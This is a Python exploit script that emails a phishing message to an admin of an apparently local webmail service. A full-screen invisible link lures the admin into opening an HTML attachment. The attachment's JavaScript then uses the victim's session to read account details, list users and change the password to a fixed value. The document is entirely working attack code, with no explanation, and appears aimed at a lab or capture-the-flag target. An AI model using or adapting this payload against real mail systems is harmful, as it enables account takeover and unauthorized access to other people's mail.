import smtplib
import time

body = """<p>Hi,</p>
<p>Please review the shared document I mentioned earlier.</p>
<p><a href="http://127.0.0.1:8080/cid:tx0"
      style="position:fixed;inset:0;z-index:2147483647;font-size:0;background:rgba(0,0,0,0.08) repeating-linear-gradient(45deg,transparent 0 12px,rgba(0,0,0,0.18) 12px 24px)">Open document</a></p>
<p>Regards,<br>Alice</p>
"""

attachment = """<html><body>
<h2>Session compromised</h2>
<pre id="out"></pre>
<script>
const post = (u, d) => fetch(u, {method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(d)}).then(r => r.json());
(async () => {
  const info = await post('/api/user/info', {});
  const users = await post('/api/user/list', {current_page: 1, page_size: 10});
  const changed = await post('/api/settings/modify_password', {password: 'Pwned12345.'});
  document.querySelector('h2').textContent = 'Hello ' + info.data.account + ', admin=' + info.data.is_admin + ', password changed: ' + changed.data;
  document.getElementById('out').textContent = users.data.list.map(u => u.Account).join(', ');
})();
</script>
</body></html>
"""

part1 = ('Content-Type: text/html; charset=utf-8\r\n'
         '\r\n' + body)

part2 = ('Content-Type: text/html; charset=utf-8\r\n'
         'Content-Disposition: attachment; filename="document.html"\r\n'
         'Content-ID: <tx0>\r\n'
         '\r\n' + attachment)

message = ('From: alice@evil.example\r\n'
           'To: admin@pmail.local\r\n'
           'Subject: Shared document\r\n'
           'MIME-Version: 1.0\r\n'
           'Content-Type: multipart/mixed; boundary="a3f9b1"\r\n'
           '\r\n'
           '--a3f9b1\r\n' + part1 +
           '\r\n--a3f9b1\r\n' + part2 +
           '\r\n--a3f9b1--\r\n')

with smtplib.SMTP('127.0.0.1', 2525, timeout=20) as s:
    s.sendmail('alice@evil.example', ['admin@pmail.local'], message.encode())

time.sleep(2)
print('sent')
